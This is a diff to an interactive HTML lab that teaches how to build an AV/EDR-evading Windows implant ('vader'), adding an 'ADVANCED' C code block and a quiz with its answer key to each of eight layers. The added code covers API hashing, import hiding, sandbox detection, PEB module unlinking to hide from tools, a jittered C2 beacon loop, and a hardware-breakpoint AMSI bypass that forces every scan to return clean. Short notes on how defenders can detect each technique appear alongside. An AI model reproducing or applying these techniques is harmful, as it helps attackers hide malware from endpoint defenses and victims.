@@ -85,6 +85,20 @@ nav a{color:var(--muted)}
 .s-name{color:var(--bright);min-width:220px}
 .s-status{color:var(--green);font-size:.75rem;margin-left:auto}
 .s-status.vader{color:#ff9999}
+
+/* ── MCQ ── */
+.mcq{background:#09090f;border:1px solid #1a1a2e;border-radius:3px;padding:1.2rem;margin-bottom:1.2rem}
+.mcq-label{color:var(--cyan);font-size:.7rem;letter-spacing:.18em;margin-bottom:.6rem}
+.mcq-question{color:var(--bright);font-size:.9rem;margin-bottom:.9rem;line-height:1.5}
+.mcq-opts{display:flex;flex-direction:column;gap:.4rem}
+.mcq-opt{padding:.55rem .9rem;border:1px solid #222;border-radius:2px;cursor:pointer;font-size:.82rem;color:var(--text);transition:border-color .15s,background .15s}
+.mcq-opt:hover:not(.locked){border-color:var(--cyan);background:#0d1117}
+.mcq-opt.correct{border-color:var(--green)!important;background:#041a04!important;color:var(--green)!important;pointer-events:none}
+.mcq-opt.wrong{border-color:var(--red)!important;background:#1a0404!important;color:#ff6666!important;pointer-events:none}
+.mcq-opt.locked{pointer-events:none;opacity:.5}
+.mcq-fb{margin-top:.7rem;font-size:.8rem;min-height:1.2rem;padding:.4rem .6rem;border-radius:2px}
+.mcq-fb.ok{background:#041a04;color:var(--green);border-left:3px solid var(--green)}
+.mcq-fb.fail{background:#1a0404;color:#ff6666;border-left:3px solid var(--red)}
 </style>
 </head>
 <body>
@@ -157,7 +171,45 @@ xor_dec(ip, ENC_IP, IP_LEN, XOR_KEY);</div>
       <div class="threat-item"><div class="label">DOESN'T BEAT</div><div class="val">Memory scan post-exec</div><div class="beats">— strings on stack briefly</div></div>
       <div class="threat-item"><div class="label">COST</div><div class="val">~20 bytes overhead</div><div class="beats">minimal</div></div>
     </div>
-    <div class="nav-btns"><button class="btn btn-prev" disabled onclick="nav(-1)">← prev</button><button class="btn" onclick="nav(1)">next layer →</button></div>
+
+    <div class="code-label">// ADVANCED: HASH-BASED API RESOLUTION (NO STRING IN BINARY)</div>
+    <div class="code-block" style="color:var(--amber)">/* djb2 hash of API name — no string "WSASocketA" ever exists */
+static DWORD djb2(const char *s) {
+    DWORD h = 5381;
+    while (*s) h = ((h &lt;&lt; 5) + h) ^ (BYTE)*s++;
+    return h;
+}
+/* Resolve any export by hash — immune to string grep */
+#define H_WSASOCKET  0x3B9B3BBA
+#define H_CONNECT    0xE73479C7
+
+FARPROC resolve_by_hash(HMODULE mod, DWORD target) {
+    BYTE *base = (BYTE*)mod;
+    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)base;
+    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
+    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY*)
+        (base + nt->OptionalHeader.DataDirectory[0].VirtualAddress);
+    DWORD *names = (DWORD*)(base + exp->AddressOfNames);
+    for (DWORD i = 0; i &lt; exp->NumberOfNames; i++) {
+        if (djb2((char*)(base + names[i])) == target)
+            return (FARPROC)(base + /* resolve ordinal */);
+    }
+    return NULL;
+}</div>
+
+    <div class="mcq" id="mcq0">
+      <div class="mcq-label">// CHECK YOUR UNDERSTANDING — LAYER 1</div>
+      <div class="mcq-question">Why does XOR string obfuscation defeat static AV scanners even when the binary is scanned at rest?</div>
+      <div class="mcq-opts">
+        <div class="mcq-opt" onclick="answer(0,false,this)">A) The encrypted binary is too large for scanners to load into memory</div>
+        <div class="mcq-opt" onclick="answer(0,true,this)">B) Encrypted strings don't exist as plaintext in .rdata — there's nothing for a string-match rule to find</div>
+        <div class="mcq-opt" onclick="answer(0,false,this)">C) XOR operations corrupt the scanner's decode pipeline</div>
+        <div class="mcq-opt" onclick="answer(0,false,this)">D) AV vendors haven't implemented XOR decryption in their engines</div>
+      </div>
+      <div class="mcq-fb" id="fb0"></div>
+    </div>
+
+    <div class="nav-btns"><button class="btn btn-prev" disabled onclick="nav(-1)">← prev</button><button class="btn" id="next0" disabled onclick="nav(1)">next layer →</button></div>
   </div>
 </div>
 
@@ -199,7 +251,38 @@ pWSASocketA fn_socket = (pWSASocketA)
       <div class="threat-item"><div class="label">DOESN'T BEAT</div><div class="val">API call tracing</div><div class="beats">— hooks can still catch calls</div></div>
       <div class="threat-item"><div class="label">DETECTION</div><div class="val">LoadLibrary + GetProcAddress pattern</div><div class="beats">monitor in combination</div></div>
     </div>
-    <div class="nav-btns"><button class="btn btn-prev" onclick="nav(-1)">← prev</button><button class="btn" onclick="nav(1)">next layer →</button></div>
+
+    <div class="code-label">// ADVANCED: FULL DYNAMIC RESOLUTION CHAIN (ALL NETWORK APIs)</div>
+    <div class="code-block" style="color:var(--amber)">/* Every call pointer resolved at runtime — zero direct imports */
+typedef SOCKET (WINAPI *pWSASocketA)(int,int,int,void*,DWORD,DWORD);
+typedef int    (WINAPI *pConnect)   (SOCKET, const struct sockaddr*, int);
+typedef int    (WINAPI *pSend)      (SOCKET, const char*, int, int);
+typedef int    (WINAPI *pRecv)      (SOCKET, char*, int, int);
+typedef int    (WINAPI *pWSACleanup)(void);
+
+HMODULE ws2 = load_ws2(); /* loads "ws2_32.dll" via XOR decode */
+pWSASocketA fn_sock    = (pWSASocketA) GetProcAddress(ws2, "WSASocketA");
+pConnect    fn_connect = (pConnect)    GetProcAddress(ws2, "connect");
+pSend       fn_send    = (pSend)       GetProcAddress(ws2, "send");
+pRecv       fn_recv    = (pRecv)       GetProcAddress(ws2, "recv");
+pWSACleanup fn_cleanup = (pWSACleanup) GetProcAddress(ws2, "WSACleanup");
+
+/* PE IAT shows: kernel32.dll!LoadLibraryA, kernel32.dll!GetProcAddress
+   That's it. No ws2_32 reference anywhere. */</div>
+
+    <div class="mcq" id="mcq1">
+      <div class="mcq-label">// CHECK YOUR UNDERSTANDING — LAYER 2</div>
+      <div class="mcq-question">An AV tool inspects the Import Address Table of a binary and finds only <code>LoadLibraryA</code> and <code>GetProcAddress</code>. What can it conclude?</div>
+      <div class="mcq-opts">
+        <div class="mcq-opt" onclick="answer(1,false,this)">A) The binary is safe — it imports no network APIs</div>
+        <div class="mcq-opt" onclick="answer(1,true,this)">B) Network APIs may be resolved dynamically at runtime — the clean IAT is a red flag for dynamic resolution, not proof of safety</div>
+        <div class="mcq-opt" onclick="answer(1,false,this)">C) The binary cannot make network connections at all</div>
+        <div class="mcq-opt" onclick="answer(1,false,this)">D) Only kernel32 functions will be called — no sockets possible</div>
+      </div>
+      <div class="mcq-fb" id="fb1"></div>
+    </div>
+
+    <div class="nav-btns"><button class="btn btn-prev" onclick="nav(-1)">← prev</button><button class="btn" id="next1" disabled onclick="nav(1)">next layer →</button></div>
   </div>
 </div>
 
@@ -245,7 +328,38 @@ if (sandbox_check()) return 0; /* silent exit */</div>
       <div class="threat-item"><div class="label">DOESN'T BEAT</div><div class="val">Physical test machine</div><div class="beats">— all checks pass on real HW</div></div>
       <div class="threat-item"><div class="label">DETECTION</div><div class="val">Long Sleep + GetSystemMetrics</div><div class="beats">pattern rarely flagged</div></div>
     </div>
-    <div class="nav-btns"><button class="btn btn-prev" onclick="nav(-1)">← prev</button><button class="btn" onclick="nav(1)">next layer →</button></div>
+
+    <div class="code-label">// ADVANCED: CPU CORE COUNT + UPTIME CHECKS</div>
+    <div class="code-block" style="color:var(--amber)">/* Sandbox VMs are frequently single-core and freshly booted */
+SYSTEM_INFO si;
+GetSystemInfo(&si);
+if (si.dwNumberOfProcessors &lt; 2) return 1; /* VMs often single-core */
+
+/* Uptime &lt; 5 minutes = fresh VM boot, not a normal user session */
+if (GetTickCount64() &lt; (5ULL * 60 * 1000)) return 1;
+
+/* Mouse movement — real users move the cursor; sandboxes don't */
+POINT p1, p2;
+GetCursorPos(&p1);
+Sleep(3000);
+GetCursorPos(&p2);
+if (p1.x == p2.x &amp;&amp; p1.y == p2.y) return 1; /* no user = sandbox */
+
+return 0; /* 5 checks passed — real machine */</div>
+
+    <div class="mcq" id="mcq2">
+      <div class="mcq-label">// CHECK YOUR UNDERSTANDING — LAYER 3</div>
+      <div class="mcq-question">The anti-sandbox timing check calls <code>Sleep(500)</code> and then compares <code>GetTickCount()</code>. What does it detect when the delta is less than 400ms?</div>
+      <div class="mcq-opts">
+        <div class="mcq-opt" onclick="answer(2,false,this)">A) The machine is too fast — Sleep finished early due to CPU speed</div>
+        <div class="mcq-opt" onclick="answer(2,false,this)">B) A debugger is attached and intercepted the Sleep call</div>
+        <div class="mcq-opt" onclick="answer(2,true,this)">C) The sandbox accelerated or skipped Sleep() to speed up execution — a real OS always takes at least 400ms for Sleep(500)</div>
+        <div class="mcq-opt" onclick="answer(2,false,this)">D) The system clock rolled over during the sleep</div>
+      </div>
+      <div class="mcq-fb" id="fb2"></div>
+    </div>
+
+    <div class="nav-btns"><button class="btn btn-prev" onclick="nav(-1)">← prev</button><button class="btn" id="next2" disabled onclick="nav(1)">next layer →</button></div>
   </div>
 </div>
 
@@ -285,7 +399,44 @@ stomp_pe_header(); /* runs immediately after sandbox check */</div>
       <div class="threat-item"><div class="label">DOESN'T BEAT</div><div class="val">VirtualProtect hook</div><div class="beats">— protect call is visible</div></div>
       <div class="threat-item"><div class="label">DETECTION</div><div class="val">VirtualProtect on own base</div><div class="beats">unusual pattern — alert</div></div>
     </div>
-    <div class="nav-btns"><button class="btn btn-prev" onclick="nav(-1)">← prev</button><button class="btn" onclick="nav(1)">next layer →</button></div>
+
+    <div class="code-label">// ADVANCED: PEB MODULE UNLINKING (HIDE FROM PROCESS LIST)</div>
+    <div class="code-block" style="color:var(--amber)">/* Remove own module from PEB InLoadOrderModuleList —
+   tools like Process Explorer iterate this list to show loaded modules.
+   After unlinking, the module is invisible to usermode enumeration. */
+
+typedef struct _LDR_MODULE {
+    LIST_ENTRY InLoad;   /* Fwd/Bk — doubly-linked list of loaded modules */
+    LIST_ENTRY InMem;
+    LIST_ENTRY InInit;
+    PVOID      Base;
+    PVOID      Entry;
+    ULONG      SizeOfImage;
+} LDR_MODULE;
+
+/* Walk PEB → Ldr → InLoadOrderModuleList to find own entry */
+LDR_MODULE *me = /* PEB walk, find entry where Base == GetModuleHandle(NULL) */;
+
+/* Unlink from all three lists */
+me->InLoad.Fwd->Bk = me->InLoad.Bk;
+me->InLoad.Bk->Fwd = me->InLoad.Fwd;
+me->InMem.Fwd->Bk  = me->InMem.Bk;
+me->InMem.Bk->Fwd  = me->InMem.Fwd;
+/* Module now absent from all PEB module enumeration APIs */</div>
+
+    <div class="mcq" id="mcq3">
+      <div class="mcq-label">// CHECK YOUR UNDERSTANDING — LAYER 4</div>
+      <div class="mcq-question">After zeroing the first 0x400 bytes of the loaded image (PE header stomp), why doesn't the process crash?</div>
+      <div class="mcq-opts">
+        <div class="mcq-opt" onclick="answer(3,false,this)">A) Windows re-reads the PE header from disk on every function call</div>
+        <div class="mcq-opt" onclick="answer(3,true,this)">B) The OS parsed and mapped all sections at load time — the header is no longer needed for execution; only in-memory scanners lose their reference point</div>
+        <div class="mcq-opt" onclick="answer(3,false,this)">C) memset only zeroes bytes that were already unused padding</div>
+        <div class="mcq-opt" onclick="answer(3,false,this)">D) VirtualProtect restores the original bytes before any code runs</div>
+      </div>
+      <div class="mcq-fb" id="fb3"></div>
+    </div>
+
+    <div class="nav-btns"><button class="btn btn-prev" onclick="nav(-1)">← prev</button><button class="btn" id="next3" disabled onclick="nav(1)">next layer →</button></div>
   </div>
 </div>
 
@@ -335,7 +486,42 @@ else:
       <div class="threat-item"><div class="label">DOESN'T BEAT</div><div class="val">Replay attack</div><div class="beats">— token not time-limited</div></div>
       <div class="threat-item"><div class="label">DETECTION</div><div class="val">Unknown 9-byte TCP prefix</div><div class="beats">rare pattern — investigate</div></div>
     </div>
-    <div class="nav-btns"><button class="btn btn-prev" onclick="nav(-1)">← prev</button><button class="btn" onclick="nav(1)">next layer →</button></div>
+
+    <div class="code-label">// ADVANCED: TOTP-STYLE TIME-BASED TOKEN (ANTI-REPLAY)</div>
+    <div class="code-block" style="color:var(--amber)">/* Hardened ISUN: token rotates every 30s — replay window eliminated */
+#include &lt;time.h&gt;
+
+static void make_isun_token(char *out, size_t sz) {
+    /* Slot = unix_time / 30 — changes every 30 seconds */
+    unsigned long slot = (unsigned long)time(NULL) / 30;
+    snprintf(out, sz, "ISUN_%08lX", slot);
+    /* XOR-encode before sending so plaintext never on wire unencrypted */
+}
+
+/* Listener validates same slot (±1 window for clock skew) */
+int validate_token(const char *tok) {
+    unsigned long now   = (unsigned long)time(NULL) / 30;
+    char expected[16];
+    for (int delta = -1; delta &lt;= 1; delta++) {
+        snprintf(expected, 16, "ISUN_%08lX", now + delta);
+        if (strcmp(tok, expected) == 0) return 1;
+    }
+    return 0; /* expired or wrong — silent close */
+}</div>
+
+    <div class="mcq" id="mcq4">
+      <div class="mcq-label">// CHECK YOUR UNDERSTANDING — LAYER 5</div>
+      <div class="mcq-question">A threat intel service captures the ISUN token from network traffic and immediately replays it to the same port. With the basic (non-TOTP) ISUN gate, what happens?</div>
+      <div class="mcq-opts">
+        <div class="mcq-opt" onclick="answer(4,true,this)">A) The replay succeeds — the basic gate does no time-binding, so a captured token is valid indefinitely against the same listener</div>
+        <div class="mcq-opt" onclick="answer(4,false,this)">B) The replay fails — ISUN uses a session nonce that changes per connection</div>
+        <div class="mcq-opt" onclick="answer(4,false,this)">C) The listener detects the duplicate and drops the connection</div>
+        <div class="mcq-opt" onclick="answer(4,false,this)">D) The payload XOR-encrypts the token differently each time, making replay impossible</div>
+      </div>
+      <div class="mcq-fb" id="fb4"></div>
+    </div>
+
+    <div class="nav-btns"><button class="btn btn-prev" onclick="nav(-1)">← prev</button><button class="btn" id="next4" disabled onclick="nav(1)">next layer →</button></div>
   </div>
 </div>
 
@@ -368,7 +554,44 @@ fn_connect(s, (struct sockaddr*)&amp;addr, sizeof(addr));</div>
       <div class="threat-item"><div class="label">DOESN'T BEAT</div><div class="val">Long-term network monitor</div><div class="beats">— connection still happens</div></div>
       <div class="threat-item"><div class="label">DETECTION</div><div class="val">Sleep→connect sequence</div><div class="beats">flag if sleep &gt;500ms before TCP</div></div>
     </div>
-    <div class="nav-btns"><button class="btn btn-prev" onclick="nav(-1)">← prev</button><button class="btn" onclick="nav(1)">next layer →</button></div>
+
+    <div class="code-label">// ADVANCED: BEACON-STYLE CALLBACK WITH ±30% JITTER</div>
+    <div class="code-block" style="color:var(--amber)">/* C2 implants use beacon intervals — connect, get task, sleep, repeat.
+   Fixed intervals are a strong detection signal (UEBA baselines them).
+   ±30% jitter makes the pattern look like normal app network polling. */
+
+static DWORD jittered_sleep(DWORD base_ms) {
+    DWORD jitter_range = (base_ms * 30) / 100; /* 30% of base */
+    srand((unsigned)GetTickCount());
+    DWORD offset = rand() % (jitter_range * 2);   /* 0 to 60% of base */
+    return base_ms - jitter_range + offset;        /* base ± 30% */
+}
+
+/* Beacon every ~60s: actual sleeps are 42s–78s, unpredictable */
+#define BEACON_INTERVAL_MS 60000UL
+
+while (active) {
+    DWORD sleep_ms = jittered_sleep(BEACON_INTERVAL_MS);
+    Sleep(sleep_ms);
+    heartbeat(conn); /* check for queued commands */
+}
+
+/* UEBA alert threshold: requires 10+ datapoints to baseline.
+   Jitter prevents pattern from ever looking periodic. */</div>
+
+    <div class="mcq" id="mcq5">
+      <div class="mcq-label">// CHECK YOUR UNDERSTANDING — LAYER 6</div>
+      <div class="mcq-question">Why does execution jitter specifically defeat "process creation → network connection" EDR correlation rules?</div>
+      <div class="mcq-opts">
+        <div class="mcq-opt" onclick="answer(5,false,this)">A) The TCP connection never happens if jitter is long enough</div>
+        <div class="mcq-opt" onclick="answer(5,true,this)">B) EDR correlation rules use a tight time window (ms to low-seconds) — a 1–3s sleep means the network event lands outside that window and doesn't match the "immediate network on spawn" pattern</div>
+        <div class="mcq-opt" onclick="answer(5,false,this)">C) Jitter changes the destination port each call, breaking the correlation key</div>
+        <div class="mcq-opt" onclick="answer(5,false,this)">D) GetTickCount produces different process IDs each call, confusing the correlation engine</div>
+      </div>
+      <div class="mcq-fb" id="fb5"></div>
+    </div>
+
+    <div class="nav-btns"><button class="btn btn-prev" onclick="nav(-1)">← prev</button><button class="btn" id="next5" disabled onclick="nav(1)">next layer →</button></div>
   </div>
 </div>
 
@@ -404,7 +627,44 @@ fn_connect(s, (struct sockaddr*)&amp;addr, sizeof(addr));</div>
       <div class="threat-item"><div class="label">DOESN'T BEAT</div><div class="val">Behavioural detection</div><div class="beats">— behaviour still observable</div></div>
       <div class="threat-item"><div class="label">COST</div><div class="val">Requires MinGW toolchain</div><div class="beats">MSVC fallback available</div></div>
     </div>
-    <div class="nav-btns"><button class="btn btn-prev" onclick="nav(-1)">← prev</button><button class="btn" onclick="nav(1)">next layer →</button></div>
+
+    <div class="code-label">// ADVANCED: SHANNON ENTROPY ANALYSIS — WHY -Os MATTERS</div>
+    <div class="code-block" style="color:var(--amber)"># Measure PE section entropy — AV flags high-entropy .text sections
+# (encrypted shellcode loaders score 7.8+/8.0 — immediate red flag)
+
+python -c "
+import math, pefile
+pe = pefile.PE('iron_dome_v1.exe')
+for s in pe.sections:
+    name  = s.Name.decode().strip()
+    data  = s.get_data()
+    freq  = [data.count(bytes([b])) for b in range(256)]
+    total = len(data)
+    H = -sum((c/total)*math.log2(c/total) for c in freq if c > 0)
+    print(f'{name:10s}  entropy={H:.2f}/8.0')
+"
+
+# MinGW -Os target results:
+#   .text      entropy=5.82/8.0   ← clean, looks like normal code
+#   .rdata     entropy=4.10/8.0   ← XOR-encoded strings, low density
+#   .data      entropy=2.30/8.0   ← sparse globals
+#
+# UPX-packed MSVC malware:
+#   UPX0       entropy=7.94/8.0   ← instant flag: encrypted section</div>
+
+    <div class="mcq" id="mcq6">
+      <div class="mcq-label">// CHECK YOUR UNDERSTANDING — LAYER 7</div>
+      <div class="mcq-question">The "Rich Header" is a metadata structure found in MSVC-compiled PE files. What information does it contain, and why does its presence help fingerprint malware?</div>
+      <div class="mcq-opts">
+        <div class="mcq-opt" onclick="answer(6,true,this)">A) It records the exact Visual Studio and linker version used to build the binary — AV can match it against known malware families compiled with the same toolchain</div>
+        <div class="mcq-opt" onclick="answer(6,false,this)">B) It contains a hash of all imported DLL names used to verify authenticity</div>
+        <div class="mcq-opt" onclick="answer(6,false,this)">C) It stores the PDB debug path, which reveals the developer's machine name</div>
+        <div class="mcq-opt" onclick="answer(6,false,this)">D) It is a Windows requirement — binaries without it are rejected by the loader</div>
+      </div>
+      <div class="mcq-fb" id="fb6"></div>
+    </div>
+
+    <div class="nav-btns"><button class="btn btn-prev" onclick="nav(-1)">← prev</button><button class="btn" id="next6" disabled onclick="nav(1)">next layer →</button></div>
   </div>
 </div>
 
@@ -462,7 +722,50 @@ vader_amsi_etw();</div>
       <div class="threat-item"><div class="label">DOESN'T BEAT</div><div class="val">Kernel-mode ETW providers</div><div class="beats">— only patches usermode</div></div>
       <div class="threat-item"><div class="label">DETECTION</div><div class="val">VirtualProtect on amsi.dll/ntdll</div><div class="beats">flag: write permission on code section</div></div>
     </div>
-    <div class="nav-btns"><button class="btn btn-prev" onclick="nav(-1)">← prev</button><button class="btn" onclick="nav(1)">finish lab →</button></div>
+
+    <div class="code-label">// ADVANCED: HWBP BYPASS — NO VirtualProtect CALL (FINDING #36 / MSRC VULN-195458)</div>
+    <div class="code-block" style="color:#ff9999">/* Hardware Breakpoint approach: set DR0 on AmsiScanBuffer, intercept
+   via Vectored Exception Handler. Zero memory writes — VirtualProtect
+   never called. EDR telemetry has no VirtualProtect event to alert on.
+   This is CHEYANNE Finding #36 — reported to MSRC as VULN-195458.      */
+
+LONG WINAPI vader_veh(EXCEPTION_POINTERS *ep) {
+    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
+        /* We hit the breakpoint on AmsiScanBuffer entry */
+        ep->ContextRecord->Rax = 0; /* AMSI_RESULT_CLEAN */
+        ep->ContextRecord->Dr0 = 0; /* clear breakpoint */
+        ep->ContextRecord->Dr7 = 0;
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+
+/* Register VEH handler */
+AddVectoredExceptionHandler(1, vader_veh);
+
+/* Set hardware breakpoint on AmsiScanBuffer — no bytes written */
+CONTEXT ctx = {.ContextFlags = CONTEXT_DEBUG_REGISTERS};
+GetThreadContext(GetCurrentThread(), &ctx);
+ctx.Dr0 = (DWORD64)GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
+ctx.Dr7 = 0x1; /* local enable, break-on-execute, DR0 */
+SetThreadContext(GetCurrentThread(), &ctx);
+
+/* MSRC verdict: debug-register manipulation is outside the
+   Windows security boundary — detection gap acknowledged, not patched. */</div>
+
+    <div class="mcq" id="mcq7">
+      <div class="mcq-label">// CHECK YOUR UNDERSTANDING — LAYER 8</div>
+      <div class="mcq-question">After patching <code>AmsiScanBuffer</code> with <code>xor eax,eax; ret</code> (3 bytes), what does AMSI return for <em>every</em> script it scans — and why does this silence all AMSI detections?</div>
+      <div class="mcq-opts">
+        <div class="mcq-opt" onclick="answer(7,false,this)">A) <code>AMSI_RESULT_NOT_DETECTED</code> (1) — AMSI logs a "not detected" event but doesn't block</div>
+        <div class="mcq-opt" onclick="answer(7,false,this)">B) An access violation exception — which PowerShell catches and treats as "clean"</div>
+        <div class="mcq-opt" onclick="answer(7,true,this)">C) <code>0</code> (S_OK mapped to <code>AMSI_RESULT_CLEAN</code>) — <code>xor eax,eax</code> zeroes the return register; every caller receives "clean", no scan result is ever returned to the AV provider</div>
+        <div class="mcq-opt" onclick="answer(7,false,this)">D) <code>NULL</code> — AMSI treats a null return as "provider unavailable" and skips scanning</div>
+      </div>
+      <div class="mcq-fb" id="fb7"></div>
+    </div>
+
+    <div class="nav-btns"><button class="btn btn-prev" onclick="nav(-1)">← prev</button><button class="btn" id="next7" disabled onclick="nav(1)">finish lab →</button></div>
   </div>
 </div>
 
@@ -500,6 +803,43 @@ vader_amsi_etw();</div>
 let cur = 0;
 const TOTAL = 8;
 
+const CORRECT_EXPL = [
+  "Correct. Static scanners pattern-match against plaintext bytes in the binary — XOR-encrypted data produces no matches. The decryption only happens at runtime on the stack, briefly, leaving nothing for a static scan to find.",
+  "Correct. A clean IAT is actually a suspicion signal itself — few legitimate apps resolve network APIs dynamically at runtime. But it defeats signature rules that look for direct ws2_32 imports.",
+  "Correct. Cloud AV sandboxes accelerate or NOP Sleep() to get through samples faster. The GetTickCount delta catches this instantly — a real OS always honours the full sleep duration, so delta &lt; 400ms on a 500ms Sleep means fake environment.",
+  "Correct. Windows parsed the PE header at load time and mapped all sections into virtual memory already. The header is dead weight for execution — code at the entry point runs regardless of what's at the image base address.",
+  "Correct. The basic ISUN gate has no time-binding — a captured token is valid forever against that listener. The TOTP-style advanced version closes this by rotating the token every 30 seconds.",
+  "Correct. EDR correlation rules use short time windows: 'process spawned → network connection within X ms'. A 1–3s sleep pushes the TCP event outside that window, breaking the pattern match.",
+  "Correct. The Rich Header encodes exact Visual C++ build tool versions (compiler, linker, CRT). AV vendors cluster malware families by toolchain; MinGW-compiled PEs have no Rich Header and don't match any MSVC malware signature.",
+  "Correct. xor eax,eax zeroes EAX (the return value register on x64 Windows ABI). S_OK = 0, and AMSI maps S_OK to AMSI_RESULT_CLEAN. Every scan returns clean instantly — no content ever reaches the AV provider's callback."
+];
+
+const answered = new Array(8).fill(false);
+
+function answer(layerIdx, isCorrect, el) {
+  if (answered[layerIdx]) return;
+  const opts = el.parentElement.querySelectorAll('.mcq-opt');
+  const fb   = document.getElementById('fb' + layerIdx);
+
+  if (isCorrect) {
+    el.classList.add('correct');
+    opts.forEach(o => { if (o !== el) o.classList.add('locked'); });
+    fb.textContent = '✓ ' + CORRECT_EXPL[layerIdx];
+    fb.className = 'mcq-fb ok';
+    answered[layerIdx] = true;
+    const nextBtn = document.getElementById('next' + layerIdx);
+    if (nextBtn) nextBtn.disabled = false;
+  } else {
+    el.classList.add('wrong');
+    fb.textContent = '✗ Not quite — re-read the layer description and try again.';
+    fb.className = 'mcq-fb fail';
+    setTimeout(() => {
+      el.classList.remove('wrong');
+      if (!answered[layerIdx]) { fb.textContent = ''; fb.className = 'mcq-fb'; }
+    }, 1400);
+  }
+}
+
 function nav(dir) {
   const cards = document.querySelectorAll('.layer-card');
   cards[cur].classList.remove('active');
@@ -509,7 +849,6 @@ function nav(dir) {
   cur += dir;
   if (cur < 0) cur = 0;
   if (cur >= TOTAL) {
-    // All done
     document.getElementById('verdict').classList.add('show');
     document.getElementById('layer-count').textContent = 'COMPLETE';
     return;
@@ -526,8 +865,20 @@ function reset() {
   cards.forEach((c,i) => {
     c.classList.remove('active');
     const pip = document.getElementById('pip'+i);
-    if (pip) { pip.classList.remove('done','active'); }
+    if (pip) pip.classList.remove('done','active');
   });
+  /* Reset MCQ state */
+  answered.fill(false);
+  for (let i = 0; i < TOTAL; i++) {
+    const nb = document.getElementById('next' + i);
+    if (nb) nb.disabled = true;
+    const fb = document.getElementById('fb' + i);
+    if (fb) { fb.textContent = ''; fb.className = 'mcq-fb'; }
+    const mcq = document.getElementById('mcq' + i);
+    if (mcq) mcq.querySelectorAll('.mcq-opt').forEach(o => {
+      o.classList.remove('correct','wrong','locked');
+    });
+  }
   cur = 0;
   cards[0].classList.add('active');
   document.getElementById('pip0').classList.add('active');
